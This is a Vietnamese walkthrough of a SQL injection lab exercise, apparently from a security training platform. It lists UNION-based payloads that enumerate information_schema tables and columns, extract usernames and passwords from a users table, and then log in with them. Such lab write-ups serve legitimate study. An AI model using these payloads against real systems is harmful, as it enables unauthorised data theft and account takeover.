![image](https://github.com/user-attachments/assets/df4f29e7-1ca3-4db6-8be7-9ab4708420e5)

Mục tiêu: liệt kê nội dung không thuộc database của phiên bản ORACLE

Sử dụng payload đã dùng trong bài SQL trước cho Microsoft như sau  \

     'UNION SELECT 'abc','def'-- -

![image](https://github.com/user-attachments/assets/41373566-c667-4dc8-9099-9b8ed262ebbd)

Nhìn trông có vẻ như payload này đã hoạt động

Trong bài nó yêu cầu lấy dữ liệu không thuộc ORACLE nên mở cheat seat xem có payload nào hữu dụng không thì sẽ có payload database content của microsoft 

     SELECT * FROM information_schema.tables

     SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

Thử với cái payload đầu kiểu

   'UNION SELECT table_name, NULL FROM information_schema.tables-- -

   ![image](https://github.com/user-attachments/assets/05daffab-8a3f-4383-ba3e-a06491c66288)

Hỏi chatgpt về information_schema.tables 

![image](https://github.com/user-attachments/assets/68ad914f-9b73-4ad4-9e07-d31875d581ba)

Sử dụng ctrl F để check và nhập user vào(chắc vậy do trong vid cookie hân hoan phần lớn sẽ chỉ có user đi với password nên là sử dụng thử)

Sau 1 lúc thì tìm ra cái này 

![image](https://github.com/user-attachments/assets/760ac388-e8ae-415f-bae2-ef947c61643d)

users_pvyfau tìm ra được bởi do nó khác với các cái user còn lại 

Sử dụng payload sau để check mật khẩu
 
   'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_pvyfau'-- -

![image](https://github.com/user-attachments/assets/90d3e7f9-ebfd-4372-bfca-05fd980b8895)

Nhìn vào có cả user và password nên ta tiếp tục sử dụng payload sau để mò ra pass cuối

'UNION SELECT username_dgwtcr,password_gxbmfa FROM users_pvyfau-- -

![image](https://github.com/user-attachments/assets/9675646c-80dd-4acb-b9e7-42b3c4bcfb42)

Viết vào phần login là ra kết quả 

![image](https://github.com/user-attachments/assets/78987c53-6dac-4a59-87e6-3288a35c2589)
